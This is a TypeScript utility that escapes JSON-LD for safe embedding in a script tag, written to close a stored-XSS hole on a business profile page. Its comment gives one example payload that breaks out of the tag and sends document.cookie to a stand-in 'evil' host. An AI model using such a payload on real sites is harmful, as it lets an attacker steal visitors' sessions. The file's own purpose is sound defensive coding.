/**
 * Safe serializer for JSON-LD embedded in a `<script>` tag.
 *
 * THE BUG THIS EXISTS TO PREVENT
 * `JSON.stringify` escapes quotes and backslashes, but NOT `<` or `/`. Inside
 * `<script type="application/ld+json">` that is a stored-XSS hole the moment any
 * value comes from a user: a salon named
 *
 *     </script><script>fetch('https://evil/'+document.cookie)</script>
 *
 * closes the JSON-LD block and runs. On /b/[slug] the affected values are
 * `business.name`, `description`, `shortDescription`, `address` and `city` --
 * free text the salon owner types, on a page every visitor loads. Signup is
 * self-serve, so an attacker only needs an account. Supabase's browser client
 * keeps the auth cookie readable from `document.cookie` (it cannot be HttpOnly,
 * the client reads it), so the payload can lift a visitor's session.
 *
 * THE FIX
 * Escape the characters that can start a tag or an entity into their JSON
 * unicode escapes. A unicode-escaped "<" is valid JSON that parses back to "<",
 * so Google and every other consumer still read the exact original value --
 * nothing is lost, and the string can no longer terminate the element.
 *
 * U+2028/U+2029 get the same treatment, and the regexes below use escape
 * SEQUENCES rather than literal characters on purpose: U+2028 is itself a line
 * terminator in JavaScript, so a literal one inside a regex literal ends the
 * line and the file stops parsing. That is not hypothetical -- it happened
 * while writing this file.
 *
 * This is the same escaping Next.js applies to its own inlined payloads. Use it
 * for EVERY `application/ld+json` block, including ones fed only static data --
 * "this input is static" is exactly the assumption that stops being true later.
 */
export function jsonLdScript(data: unknown): string {
  return JSON.stringify(data)
    .replace(/</g, "\\u003c")
    .replace(/>/g, "\\u003e")
    .replace(/&/g, "\\u0026")
    .replace(/\u2028/g, "\\u2028")
    .replace(/\u2029/g, "\\u2029");
}
